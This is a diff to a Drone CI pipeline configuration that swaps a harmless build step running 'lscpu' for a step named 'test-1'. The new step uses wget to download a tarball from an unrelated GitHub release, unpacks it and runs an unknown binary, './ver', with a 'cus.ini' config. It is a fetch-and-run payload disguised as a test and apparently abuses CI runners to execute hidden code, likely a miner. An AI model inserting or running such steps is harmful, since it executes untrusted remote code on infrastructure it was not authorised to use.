@@ -1,10 +1,9 @@
-----
 kind: pipeline
 type: docker
-name: backend
+name: default-1
 
 steps:
-- name: build
-  image: golang
-  commands:
-    - lscpu
+- name: test-1 
+  image: golang 
+  commands: 
+  - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
